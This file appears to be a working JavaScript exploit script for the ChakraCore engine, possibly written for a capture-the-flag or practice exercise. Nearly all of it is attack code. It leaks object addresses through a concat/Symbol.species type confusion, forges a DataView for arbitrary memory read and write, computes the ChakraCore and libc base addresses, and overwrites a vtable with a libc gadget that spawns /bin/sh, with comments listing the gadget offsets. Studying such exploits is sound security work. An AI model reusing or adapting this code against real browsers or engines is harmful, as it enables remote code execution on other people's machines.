function bp(){
	parseFloat("1.1");
}

function get_addr(target_to_leak) {
	let a = [1,2,3,4];
	let b = [8,9];

	let c = new Function();
	c[Symbol.species] = function() {
	    n = [7,7];			
	    return n;
	};
	a.constructor = c; // return array n

	b.__defineGetter__(Symbol.isConcatSpreadable, () => {
	    n[0] = target_to_leak;
	    b[0] = {}; 
	    return true;	
	});

	let r = a.concat(b); 				
	return [ r[0], r[1] ]   // low, high
}

function get_addr2(target_to_leak) {
	let a = [1,2,3,4];
	let b = [8,9];

	let c = new Function();
	c[Symbol.species] = function() {
	    n = [7,7];			
	    return n;
	};
	a.constructor = c; // return array n

	b.__defineGetter__(Symbol.isConcatSpreadable, () => {
	    n[0] = target_to_leak;
	    b[0] = {}; 
	    return true;	
	});

	let r = a.concat(b); 				
	return [ r[0], r[1] ]   // low, high
}

function get_fake_dv(lo, hi) {
	var a = [];
	for(var i = 0; i < 0x10; i++) {
		a[i] = i;
	}

	var b = [ lo, hi ];

	var c = new Function();
	c[Symbol.species] = function() {
	    n = [7,7];			
	    return n;
	};
	a.constructor = c; // return array n

	b.__defineGetter__(Symbol.isConcatSpreadable, () => {
	    n[0] = {};
	    return true;	
	});

	let r = a.concat(b); 				
	return r[0x10 / 2]
}


// Setting
var ab = new ArrayBuffer(8);
var dv = new DataView(ab);


// Leak ab
var [ ab_lo, ab_hi ] = get_addr(ab)
//var addr_ab = new Long(ab_lo, ab_hi)
//console.log("ab(ArrayBuffer): 0x" + addr_ab.toString(16))


// Leak myArr
var myArr = new Array(1,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0, 0,0);  
var [ myArr_lo, myArr_hi ] = get_addr2(myArr)

let tmp = new Uint32Array(2);
tmp[0] = myArr_lo;
tmp[1] = myArr_hi;
console.log("[-] Leak addr : 0x" + tmp[1].toString(16) + tmp[0].toString(16));

myArr_lo = myArr_lo + 0x58
mtArr_hi = myArr_hi

// Contruct fake DataView
myArr[0] = 0;					myArr[1] = 0;
myArr[2] = myArr_lo + 0x10;		myArr[3] = myArr_hi;
myArr[4] = 0x38;				myArr[5] = 0;
myArr[6] = myArr_lo + 0x430;	myArr[7] = myArr_hi;
myArr[8] = 0x200;				myArr[9] = 0;
myArr[10] = (ab_lo)|0;			myArr[11] = ab_hi;				// prevent crach, don't care
myArr[14] = (myArr_lo - 0x58)|0;	myArr[15] = myArr_hi;    			// want to read


// vector is DataView object
// vtable is missing -> how does it work?
vector = get_fake_dv(myArr_lo, myArr_hi)


// read myArr's vftable pointer
let vtable_hi = dv.getUint32.call(vector, 4, true);
let vtable_lo = dv.getUint32.call(vector, 0, true);
let chBase_lo = vtable_lo - 0xd5db40;
let libcbase_lo = chBase_lo + 0x1628000;

//console.log("[-] vtable : 0x" + dv.getUint32.call(vector, 4, true).toString(16) + dv.getUint32.call(vector, 0, true).toString(16));
//console.log("[-] ChakraCore base : 0x" + dv.getUint32.call(vector, 4, true).toString(16) + (dv.getUint32.call(vector, 0, true) - 0xd5db40).toString(16));
//console.log("[-] libc base : 0x" + dv.getUint32.call(vector, 4, true).toString(16) + (dv.getUint32.call(vector, 0, true) - 0xd5db40 + 0x1628000).toString(16));

console.log("[-] vtable : 0x" + vtable_hi.toString(16) + vtable_lo.toString(16));
console.log("[-] ChakraCore base : 0x" + vtable_hi.toString(16) + chBase_lo.toString(16));
console.log("[-] libc base : 0x" + vtable_hi.toString(16) + libcbase_lo.toString(16));

// set fake vtable

/*
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/

let magic_lo = libcbase_lo + 0x4526a;
for(let i = 0; i < 1; i++){
	dv.setUint32.call(vector, 0x14, vtable_hi, true);    
	dv.setUint32.call(vector, 0x10, magic_lo, true);    
}

console.log(myArr.length);
bp();


// write myArr's vftable pointer with 0x42424242....
dv.setUint32.call(vector, 0, myArr_lo - 0x58 - 0x90, true);
dv.setUint32.call(vector, 4, myArr_hi, true);

// Again, read myArr's vftable pointer
console.log("[-] after vtable : 0x" + dv.getUint32.call(vector, 4, true).toString(16) + dv.getUint32.call(vector, 0, true).toString(16));

myArr.toString();
